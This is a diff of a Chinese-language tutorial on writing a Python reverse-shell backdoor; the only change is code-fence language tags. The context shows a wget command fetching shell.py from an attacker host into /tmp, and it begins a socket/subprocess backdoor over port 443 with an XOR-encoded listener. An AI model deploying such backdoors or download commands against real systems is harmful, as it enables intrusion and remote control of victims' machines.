@@ -6,14 +6,14 @@
 
 创建一个 python HTTP 服务器可以直接使用 python 的内建函数"SimpleHTTPServer"来创建，你可以使用'-m'参数直接在命令行调用模块，创建的服务器默认是监听的 8000 端口，但是你可以指定端口，直接在'SimpleHTTPServer'后面跟一个端口参数:
 
-```
+```py
 python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 80 ... 
 ```
 
 我们假设你没有防火墙去阻止你的连接，那么你是可以请求到这服务器的数据。你可以在任何目录里面去启动 Python HTTP 服务器，这样你就能够通过浏览器或者是远程客户端来访问这个目录。这里有一个简单的例子告诉你使用 wget 工具去获取文件,但是有些时候就会经常发现你根本没有权限在当前目录写入文件并且初始化这个脚本，但是你可以改变脚本执行的目录，下面这个例子就演示了把脚本在/tmp 目录下面执行：
 
-```
+```py
 #使用-O 参数，把文件保存在其他目录- /tmp/ 一般可写
 wget -O /tmp/shell.py http://<attacker_ip>/shell.py
 
@@ -29,7 +29,7 @@ file /tmp/shell.py
 
 现在让我看一个实际的后门代码。我们将会使用 socket，subprocess 和 sys 模块，我非常的喜欢 subprocess 模块因为它允许你能储存 STDOUT 给一个变量，然后在脚本中的其他地方使用，然后新增一个传输层，通过 443 端口来传输文件，这个端口经常用在传输 ssl 的数据可以很容易的混淆数据:
 
-```
+```py
 #!/usr/bin/python
 
 import socket,subprocess,sys
@@ -64,7 +64,7 @@ s.close()
 
 现在为了利用好这个后门，我们需要一个监听脚本并且解码后端传输过来的数据，让我们通过明文很清晰的看清楚返回的数据。下面我们将要设计一个监听器。来获取反向 shell 的数据，并且能够对于输入／输出的进行解码/编码，为了能够在终端上面能够很清晰的看出来，所以需要使用 XOR 编码:
 
-```
+```py
 import socket 
 
 s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
